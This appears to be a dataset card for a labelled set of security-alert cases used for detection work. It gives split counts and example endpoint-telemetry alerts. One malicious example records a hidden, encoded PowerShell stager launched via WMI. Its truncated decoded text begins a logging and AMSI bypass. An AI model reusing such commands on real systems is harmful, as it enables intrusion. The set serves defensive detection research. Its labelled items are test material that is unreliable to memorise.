# Case set (2.6, 2.7)

759 cases. Characters per case: median 1067, p95 1560, max 2124 (≈ tokens at 3.5 chars/token: 304, 445, 606).

| Split | Source | Malicious | Context | Excused | Benign | Alert points |
|---|---|---|---|---|---|---|
| dev | wave | 63 | 41 | 0 | 71 | 15 |
| dev | window | 7 | 3 | 0 | 328 | 1 |
| dev | probe | 0 | 0 | 0 | 10 | 0 |
| holdout | wave | 38 | 15 | 0 | 12 | 7 |
| holdout | window | 8 | 0 | 0 | 96 | 1 |
| holdout | probe | 1 | 3 | 2 | 5 | 1 |
| eval | wave | 14 | 33 | 0 | 9 | 3 |

## Examples

`atk-0dfa:a1ae96c8-b48d-739d-3955-fd1598ab9d34` · malicious · process

```
Machine host-0dfa · 2000-04-03 14:45:00
New process: powershell.exe as SYSTEMIACOM\zleazer
Command line: C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAcwBJAE8ATgAuAE0AYQBKA …[+352 chars]
Decoded -EncodedCommand: IF($PSVersIONTABLE.PSVeRsION.MaJor -Ge 3){$GPF=[REF].ASsemBly.GeTTyPE('System.Management.Automation.Utils')."GEtFIE`LD"('cachedGroupPolicySettings','N'+'onPublic,S�
Parent: wmiprvse.exe (start not seen)
Baseline: parent → child pair wmiprvse.exe → powershell.exe not seen in this machine's last hour; seen on 0 of 61 other machines.
Recent activity on this machine (last 2 min):
- 14:43:00 cmd.exe ← svchost.exe : C:\Windows\SYSTEM32\cmd.exe /c "C:\ncr\DeleteArchiveSecurity.bat"
- 14:43:00 conhost.exe ← ping.exe : \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
- 14:44:00 cmd.exe ← svchost.exe : C:\Windows\SYSTEM32\cmd.exe /c "C:\ncr\DeleteArchiveSecurity.bat"
- 14:44:00 conhost.exe ← cmd.exe : \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
- 14:44:59 svchost.exe → 10.20.0.153:63687 (outbound)
- 14:44:59 svchost.exe → 10.20.0.153:52770 (outbound)
- 14:44:59 svchost.exe → 10.20.0.153:56982 (outbound)
- 14:44:59 lsass.exe → 10.241.215.106:389 (outbound)
```

`w01:d10fbe21-6582-1747-6386-4a00805f634a` · malicious · flow

```
Machine host-83fa · 2000-09-07 13:54:36
Outbound connection: mstsc.exe → 10.47.35.74:3389 (private address, protocol 6)
Process: mstsc.exe started 13:54:16 as SYSTEMIACOM\sysadmin: "C:\Windows\system32\mstsc.exe" 
Its parent: explorer.exe started 13:48:25 as SYSTEMIACOM\sysadmin: C:\Windows\Explorer.EXE
Baseline: mstsc.exe never used port 3389 in this machine's last hour; seen on 2 of 62 other machines.
Recent activity on this machine (last 2 min):
- 13:54:32 logon interactive Font Driver Host\UMFD-5 from local
- 13:54:32 dwm.exe ← winlogon.exe : "dwm.exe"
- 13:54:32 logon interactive Window Manager\DWM-5 from local
- 13:54:32 logon interactive Window Manager\DWM-5 from local
- 13:54:32 logon grant Window Manager\DWM-5 from local
- 13:54:32 logon grant Window Manager\DWM-5 from local
- 13:54:32 logon logout SYSTEMIACOM\sbobertz from local
- 13:54:32 fontdrvhost.exe ← winlogon.exe : "fontdrvhost.exe"
```

`atk-efdb:99f521df-df5a-f8f0-a8be-6e39e966e5fb` · benign · process

```
Machine host-efdb · 2000-04-08 11:22:59
New process: conhost.exe as NT AUTHORITY\SYSTEM
Command line: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
Parent: findstr.exe (start not seen)
Baseline: parent → child pair findstr.exe → conhost.exe not seen in this machine's last hour; seen on 0 of 61 other machines.
Recent activity on this machine (last 2 min):
- 11:21:46 backgroundtaskhost.exe ← svchost.exe : "C:\Windows\system32\backgroundTaskHost.exe" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca
- 11:21:51 dllhost.exe ← svchost.exe : C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
- 11:21:56 backgroundtaskhost.exe ← svchost.exe : "C:\Windows\system32\backgroundTaskHost.exe" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca
- 11:21:59 cmd.exe ← svchost.exe : C:\Windows\SYSTEM32\cmd.exe /c "C:\ncr\DeleteArchiveSecurity.bat"
- 11:21:59 conhost.exe ← cmd.exe : \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
- 11:22:41 firefox.exe ← explorer.exe : "C:\Program Files (x86)\Mozilla Firefox\firefox.exe" 
- 11:22:56 helper.exe ← firefox.exe : "C:\Program Files (x86)\Mozilla Firefox\uninstall\helper.exe" /UpdateShortcutAppUserModelIds
- 11:22:59 cmd.exe ← svchost.exe : C:\Windows\SYSTEM32\cmd.exe /c "C:\ncr\DeleteArchiveSecurity.bat"
```

`atk-875d:860915a5-5b1f-7e04-5c4f-74a855deb693` · benign · flow

```
Machine host-875d · 2000-08-07 13:34:16
Outbound connection: svchost.exe → 10.50.2.2:52434 (private address, protocol 17)
Process: svchost.exe (start not seen)
Baseline: svchost.exe never used port 52434 in this machine's last hour; seen on 0 of 61 other machines.
Recent activity on this machine (last 2 min):
- 13:33:01 onedrivesetup.exe ← cmd.exe : C:\Windows\SysWOW64\OneDriveSetup.exe  /uninstall
- 13:33:05 onedrivesetup.exe ← onedrivesetup.exe : "C:\Windows\SysWOW64\OneDriveSetup.exe" C:\Windows\SysWOW64\OneDriveSetup.exe /uninstall  /permachine  /silent  /childpr …[+22 chars]
- 13:33:06 onedrivesetup.exe ← onedrivesetup.exe : C:\Windows\SysWOW64\OneDriveSetup.exe /uninstall  /peruser  /childprocess 
- 13:33:13 svchost.exe → 10.241.215.106:53 (outbound)
- 13:33:14 sc.exe ← cmd.exe : sc  config OneSyncSvc start=disabled
- 13:34:01 cmd.exe ← svchost.exe : C:\Windows\SYSTEM32\cmd.exe /c "C:\ncr\DeleteArchiveSecurity.bat"
- 13:34:01 conhost.exe ← cmd.exe : \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
- 13:34:16 system → 10.50.2.2:137 (outbound)
```

